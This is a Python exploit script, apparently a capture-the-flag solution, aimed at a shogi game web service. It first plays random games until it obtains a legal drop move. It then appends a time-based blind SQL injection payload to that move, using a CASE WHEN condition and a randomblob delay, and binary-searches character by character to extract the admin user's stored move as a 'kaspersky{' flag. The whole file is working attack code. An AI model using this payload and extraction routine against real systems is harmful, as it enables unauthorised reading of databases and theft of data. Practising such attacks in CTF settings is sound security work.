import random
import statistics
import sys
import time

import cshogi
import requests


BASE = sys.argv[1].rstrip("/")
BLOB_SIZE = 100_000_000


def state(client):
    response = client.get(BASE + "/game/state", timeout=15)
    response.raise_for_status()
    return response.json()


def prepare_drop(client):
    rng = random.Random(0xBEE)

    for _ in range(20):
        client.post(BASE + "/game/new", timeout=15).raise_for_status()

        for _ in range(150):
            current = state(client)
            drops = [move for move in current["legal_moves"] if "*" in move]
            if drops:
                return drops[0]

            board = cshogi.Board(current["sfen"])
            hand_before = sum(board.pieces_in_hand[cshogi.BLACK])
            captures = []

            for move in current["legal_moves"]:
                probe = cshogi.Board(current["sfen"])
                probe.push_usi(move)
                if sum(probe.pieces_in_hand[cshogi.BLACK]) > hand_before:
                    captures.append(move)

            choices = captures or current["legal_moves"]
            if not choices:
                break
            client.post(
                BASE + "/game/move",
                json={"move": rng.choice(choices)},
                timeout=15,
            )

    raise RuntimeError("could not get a legal drop move")


def measure(client, drop, condition):
    payload = (
        drop
        + "' OR ((CASE WHEN ("
        + condition
        + f") THEN length(randomblob({BLOB_SIZE})) ELSE 0 END) * NULL), "
        + "datetime('now')) -- "
    )
    started = time.perf_counter()
    response = client.post(BASE + "/game/move", json={"move": payload}, timeout=30)
    elapsed = time.perf_counter() - started
    if response.status_code != 500:
        raise RuntimeError(f"unexpected response: {response.status_code}")
    return elapsed


def check(client, drop, condition, threshold):
    samples = [measure(client, drop, condition) for _ in range(3)]
    return statistics.median(samples) > threshold


client = requests.Session()
drop = prepare_drop(client)

fast = [measure(client, drop, "1=0") for _ in range(4)]
slow = [measure(client, drop, "1=1") for _ in range(4)]
threshold = (statistics.median(fast) + statistics.median(slow)) / 2

expression = (
    "(SELECT move FROM game_moves "
    "WHERE user_id='admin' ORDER BY id ASC LIMIT 1)"
)
flag = ""

for position in range(1, 129):
    if not check(
        client,
        drop,
        f"unicode(substr({expression},{position},1)) IS NOT NULL",
        threshold,
    ):
        break

    low, high = 31, 126
    while low + 1 < high:
        middle = (low + high) // 2
        if check(
            client,
            drop,
            f"unicode(substr({expression},{position},1))>{middle}",
            threshold,
        ):
            low = middle
        else:
            high = middle

    flag += chr(high)
    print(flag, flush=True)
    if flag.startswith("kaspersky{") and flag.endswith("}"):
        break

print("flag:", flag)


